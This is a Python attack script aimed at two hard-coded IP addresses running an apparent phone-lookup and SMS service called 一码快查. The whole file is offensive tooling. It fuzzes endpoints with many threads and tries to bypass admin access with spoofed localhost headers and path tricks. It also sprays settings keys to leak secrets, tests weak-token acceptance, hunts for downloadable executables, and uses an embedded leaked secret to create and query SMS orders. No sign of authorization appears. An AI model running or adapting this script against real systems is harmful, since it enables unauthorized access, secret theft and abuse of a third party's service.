#!/usr/bin/env python3
"""Deep probe for updated 一码快查 stack."""
from __future__ import annotations

import json
import string
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

MAIN = "http://43.154.128.116:9110"
SMS = "http://47.76.163.227:8081"
LEGACY_SECRET = "18cdfb81a4e44a3a915528e67d923dba"


def call(method: str, url: str, payload: dict | None = None, headers: dict | None = None) -> tuple[int, str]:
    data = json.dumps(payload).encode() if payload is not None else None
    h = {"Content-Type": "application/json"} if data is not None else {}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def register_login() -> tuple[str, str]:
    user = f"deep_{int(time.time())}"
    call("POST", f"{MAIN}/api/desktop/register", {"username": user, "password": "deep12345"})
    _, body = call("POST", f"{MAIN}/api/desktop/login", {"username": user, "password": "deep12345"})
    login = json.loads(body)
    return user, login["token"]


def fuzz_8081() -> list[tuple[str, str, int, str]]:
    words = """
    create query setsms balance order orders cancel close finish stop end delete remove
    list history record records log logs stats stat info status config settings health ping
    version swagger docs api v1 v2 admin user users account phone mobile sms bind qq verify
    code token auth login register pay payment recharge refund deduct charge price fee cost
    blacklist ban block allow whitelist callback notify webhook upload download file export
    import batch bulk search find get post put patch head options trace connect
    """.split()
    found: list[tuple[str, str, int, str]] = []
    seen: set[tuple[str, str, int]] = set()

    def probe(method: str, path: str) -> None:
        url = SMS + path
        body = {"area": "86", "data": "17300000888", "islink": False} if method == "POST" else None
        code, text = call(method, url, body)
        key = (method, path, code)
        if code == 404 or key in seen:
            return
        seen.add(key)
        if code == 405 and not text:
            return
        found.append((method, path, code, text[:120]))

    tasks: list[tuple[str, str]] = []
    for w in words:
        tasks.append(("GET", f"/{w}"))
        tasks.append(("POST", f"/{w}"))
        tasks.append(("GET", f"/{w}/{LEGACY_SECRET}"))
        tasks.append(("POST", f"/{w}/{LEGACY_SECRET}"))
        tasks.append(("GET", f"/api/{w}"))
        tasks.append(("POST", f"/api/{w}/{LEGACY_SECRET}"))

    with ThreadPoolExecutor(max_workers=40) as pool:
        futs = [pool.submit(probe, m, p) for m, p in tasks]
        for fut in as_completed(futs):
            fut.result()
    return sorted(found)


def fuzz_9110(token: str, username: str) -> list[tuple[str, str, int, str]]:
    words = """
    login register logout user-info settings profile me balance orders order history records
    sms create query pay payment recharge card refund decrease increase transfer token refresh
    verify captcha bind phone mobile area config version health notice announcement download
    host exe client desktop app update upgrade changelog admin users cards delete generate
    """.split()
    found: list[tuple[str, str, int, str]] = []
    seen: set[tuple[str, str, int]] = set()

    def probe(method: str, path: str) -> None:
        url = MAIN + path
        payload = None
        if method == "POST":
            payload = {"username": username, "token": token, "amount": 1}
        code, text = call(method, url, payload)
        key = (method, path, code)
        if code == 404 or key in seen:
            return
        seen.add(key)
        if code == 405 and "Method Not Allowed" in text:
            return
        found.append((method, path, code, text[:120]))

    tasks: list[tuple[str, str]] = []
    for w in words:
        tasks.append(("GET", f"/api/desktop/{w}"))
        tasks.append(("POST", f"/api/desktop/{w}"))
        tasks.append(("GET", f"/api/desktop/{w}?username={username}&token={token}"))
    for w in ["users", "cards", "settings", "login", "dashboard", "delete-cards", "generate-card"]:
        tasks.append(("GET", f"/admin/{w}"))
        tasks.append(("POST", f"/admin/{w}"))

    with ThreadPoolExecutor(max_workers=30) as pool:
        futs = [pool.submit(probe, m, p) for m, p in tasks]
        for fut in as_completed(futs):
            fut.result()
    return sorted(found)


def admin_bypass() -> list[str]:
    hits: list[str] = []
    paths = ["/admin/users", "/admin/cards", "/admin/settings", "/admin/delete-cards"]
    header_sets = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Host": "127.0.0.1:9110"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
    ]
    for path in paths:
        for hdr in header_sets:
            code, body = call("GET", MAIN + path, headers=hdr)
            if code != 403:
                hits.append(f"{path} {hdr} -> {code} {body[:80]}")
    for path in paths:
        for variant in [path + "/", path + "/../admin/users", "/./admin/users", "/admin%2fusers"]:
            code, body = call("GET", MAIN + variant)
            if code != 403 and code != 404:
                hits.append(f"path {variant} -> {code} {body[:80]}")
    return hits


def settings_key_spray() -> list[tuple[str, str]]:
    hits: list[tuple[str, str]] = []
    keys = set()
    bases = [
        "api", "sms", "app", "client", "server", "desktop", "host", "exe", "download", "update",
        "pay", "payment", "epay", "alipay", "wx", "wechat", "qq", "telegram", "bot", "secret",
        "key", "token", "domain", "url", "link", "notice", "announce", "version", "price",
        "deduct", "balance", "admin", "password", "debug", "maintenance", "ban", "block",
    ]
    suffixes = ["", "_secret", "_key", "_token", "_url", "_domain", "_exe", "_version", "_notice"]
    for b in bases:
        for s in suffixes:
            keys.add((b + s).strip("_"))
    for k in sorted(keys):
        code, body = call("GET", f"{MAIN}/api/desktop/settings?key={urllib.parse.quote(k)}")
        if code == 200:
            val = json.loads(body).get("value", "")
            if val:
                hits.append((k, val))
    return hits


def token_checks(username: str, token: str) -> list[str]:
    lines: list[str] = []
    # empty / truncated token
    for t in ["", token[:8], token[:-8], token[::-1], token.upper(), token.lower()]:
        code, body = call("GET", f"{MAIN}/api/desktop/user-info?username={username}&token={t}")
        if code == 200:
            lines.append(f"weak token accepted: {repr(t)[:30]}")
    # token in header
    for hdr in [
        {"Authorization": f"Bearer {token}"},
        {"token": token},
        {"X-Token": token},
    ]:
        code, body = call("GET", f"{MAIN}/api/desktop/user-info?username={username}", headers=hdr)
        if code == 200 and '"ok":true' in body:
            lines.append(f"header auth works: {list(hdr.keys())[0]}")
    # reuse after re-login
    _, body2 = call("POST", f"{MAIN}/api/desktop/login", {"username": username, "password": "deep12345"})
    token2 = json.loads(body2)["token"]
    code, body = call("GET", f"{MAIN}/api/desktop/user-info?username={username}&token={token}")
    lines.append(f"old token after relogin: {code} {body[:80]}")
    code, body = call("GET", f"{MAIN}/api/desktop/user-info?username={username}&token={token2}")
    lines.append(f"new token: {code} ok={('"ok":true' in body)}")
    return lines


def legacy_secret_surface() -> list[str]:
    lines: list[str] = []
    sec = LEGACY_SECRET
    phone = "17300000777"
    code, body = call("POST", f"{SMS}/create/{sec}", {"area": "86", "data": phone, "islink": False})
    lines.append(f"create: {body[:120]}")
    if '"code":0' in body:
        oid = json.loads(body)["data"]
        code, body = call("GET", f"{SMS}/query/{sec}/{oid}")
        lines.append(f"query pending: {body[:120]}")
        code, body = call("GET", f"{SMS}/setsms/{sec}/{phone}/000000")
        lines.append(f"setsms dummy: {body[:120]}")
    code, body = call("GET", f"{SMS}/balance/{sec}")
    lines.append(f"balance: {body[:60]}")
    # path variants
    for p in [f"/balance/{sec}/", f"/Balance/{sec}", f"/BALANCE/{sec}"]:
        code, body = call("GET", SMS + p)
        if code != 404:
            lines.append(f"{p} -> {code} {body[:60]}")
    return lines


def download_hunt() -> list[tuple[str, int, str]]:
    hits: list[tuple[str, int, str]] = []
    paths = [
        "/host.exe", "/desktop.exe", "/app.exe", "/client.exe",
        "/download/host.exe", "/download/desktop.exe", "/static/host.exe", "/files/host.exe",
        "/api/desktop/download", "/api/desktop/host.exe", "/api/desktop/exe",
        "/release/host.exe", "/dist/host.exe", "/update/host.exe",
    ]
    for p in paths:
        code, body = call("GET", MAIN + p)
        if code != 404:
            hits.append((p, code, body[:80]))
    for key in ["host_exe", "download_url", "update_url", "exe_url", "client_url", "app_url"]:
        code, body = call("GET", f"{MAIN}/api/desktop/settings?key={key}")
        if code == 200:
            val = json.loads(body).get("value", "")
            if val:
                hits.append((f"settings:{key}", 200, val))
    return hits


def main() -> None:
    print("=== DEEP PROBE START ===\n")
    user, token = register_login()
    print(f"user={user}\n")

    print("[8081 fuzz]")
    for row in fuzz_8081():
        print(row)

    print("\n[9110 fuzz]")
    for row in fuzz_9110(token, user):
        print(row)

    print("\n[admin bypass]")
    bypass = admin_bypass()
    print(bypass or ["none"])

    print("\n[settings spray]")
    for k, v in settings_key_spray():
        print(k, "=", v[:100])

    print("\n[token checks]")
    for line in token_checks(user, token):
        print(line)

    print("\n[legacy secret]")
    for line in legacy_secret_surface():
        print(line)

    print("\n[download hunt]")
    for row in download_hunt():
        print(row)

    print("\n=== DONE ===")


if __name__ == "__main__":
    main()
